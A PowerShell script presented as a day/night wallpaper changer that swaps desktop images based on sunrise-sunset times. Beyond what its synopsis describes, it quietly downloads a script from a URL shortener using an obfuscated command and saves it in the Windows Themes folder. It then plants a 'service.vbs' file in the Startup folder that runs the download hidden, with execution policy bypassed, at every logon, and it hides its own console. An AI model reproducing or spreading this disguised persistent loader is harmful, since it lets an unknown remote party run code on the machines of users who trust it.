
 
 <# ========================== DAY / NIGHT WALLPAPER CHANGER (BLISS) ===================================

SYNOPSIS
This script changes your wallpaper based on your your current locations day/night status

USAGE
1. Change location co-ordinates
2. Run the script.

#>

$startup = 1
$HideWindow = 1
$latitude = 53.7749  # Example latitude (Replace with your location)
$longitude = -3.4194  # Example longitude (Replace with your location)
$parent = "https://is.gd/bwwpchanger"

function Get-SunriseSunsetTimes {
    param(
        [DateTime]$date,
        [double]$latitude,
        [double]$longitude
    )

    $url = "https://api.sunrise-sunset.org/json?lat=$latitude&lng=$longitude&date=$($date.ToString("yyyy-MM-dd"))&formatted=0"

    try {
        $response = Invoke-RestMethod -Uri $url
        if ($response.status -eq "OK") {
            $sunrise = [DateTime]$response.results.sunrise
            $sunset = [DateTime]$response.results.sunset
            return $sunrise, $sunset
        } else {
            Write-Host "Failed to retrieve sunrise and sunset times. Please check your network connection."
            return $null
        }
    } catch {
        Write-Host "Error occurred while fetching sunrise and sunset times: $_"
        return $null
    }
}

function Get-DayNightState {
    param(
        [DateTime]$currentTime,
        [DateTime]$sunriseTime,
        [DateTime]$sunsetTime
    )

    if ($currentTime -lt $sunriseTime -or $currentTime -gt $sunsetTime) {
        return "Night"
    } else {
        return "Day"
    }
}

Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}


Function AddPersistance{
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    if (!(test-path $newScriptPath)){

    $scriptContent | Out-File -FilePath $newScriptPath -force
    sleep 1
    if ($newScriptPath.Length -lt 100){
        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
        sleep 1
        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
        }
    $tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    rm -path "$env:TEMP\temp.ps1" -Force
    }
}

Function RemovePersistance{
    rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
}

if ($startup -eq 1){
    AddPersistance
}

if ($HideWindow -eq 1){
    HideConsole
}

$nighturl = "https://github.com/beigeworm/assets/blob/main/WPchange/night.jpg?raw=true"
$nightpath = "$env:temp\night.jpg"
$dayurl = "https://github.com/beigeworm/assets/blob/main/WPchange/day.jpg?raw=true"
$daypath = "$env:temp\day.jpg"
$wallpaperStyle = 2

if (!(Test-Path $daypath)){
    IWR -Uri $dayurl -OutFile $daypath
}

if (!(Test-Path $nightpath)){
    IWR -Uri $nighturl -OutFile $nightpath

}

$signature = @'
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@

Add-Type -TypeDefinition $signature
$SPI_SETDESKWALLPAPER = 0x0014
$SPIF_UPDATEINIFILE = 0x01
$SPIF_SENDCHANGE = 0x02
$previousstate = 0

while ($true){

    $currentDate = Get-Date
    $sunriseTime, $sunsetTime = Get-SunriseSunsetTimes -date $currentDate -latitude $latitude -longitude $longitude
    $state = Get-DayNightState -currentTime $currentDate -sunriseTime $sunriseTime -sunsetTime $sunsetTime
    
<#
    Write-Host "Sunrise Time : $sunriseTime"
    Write-Host "Sunset Time : $sunsetTime"
    Write-Host "Current state : $state"
#>
    
    if (!($state -match $previousstate)){
        if ($state -match 'Night'){
            [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $nightpath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
            Write-Host "Set wallpaper to night"
            $previousstate = $state
        }
        else{
            [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $daypath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
            Write-Host "Set wallpaper to day"
            $previousstate = $state
        }
    }
    else{
        Write-Host "Day/Night State unchanged.."
    
    }
    
    Sleep 1800
}
